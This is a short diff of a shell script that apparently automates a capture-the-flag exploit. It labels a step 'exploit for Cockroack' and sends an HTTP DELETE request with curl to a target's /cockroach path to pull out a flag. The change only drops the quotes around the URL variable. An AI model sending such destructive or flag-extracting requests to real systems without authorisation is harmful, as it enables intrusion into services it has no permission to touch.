@@ -14,6 +14,6 @@ fi
 # Cockroack
 echo "Start exploit for Cockroack"
 remote=$remote'/cockroach'
-flag=$(curl -s -X DELETE "$remote")
+flag=$(curl -s -X DELETE $remote)
 echo "Flag is $flag"
 echo "-------------------------"
